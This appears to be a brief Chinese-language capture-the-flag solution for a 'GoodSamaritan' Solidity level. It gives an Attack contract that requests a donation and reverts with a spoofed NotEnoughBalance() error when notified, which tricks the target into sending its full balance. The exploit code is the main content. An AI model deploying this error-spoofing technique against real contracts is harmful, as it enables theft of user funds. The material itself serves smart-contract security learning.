在接受代币的合约中实现 `notify` 并抛出 `NotEnoughBalance()` 即可。

```solidity
pragma solidity >=0.8.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract Attack is INotifyable {
    error NotEnoughBalance();

    function attack(address _level) public {
        GoodSamaritan(_level).requestDonation();
    }

    function notify(uint256 amount) public pure {
        if (amount == 10)
            revert NotEnoughBalance();
    }
}
```

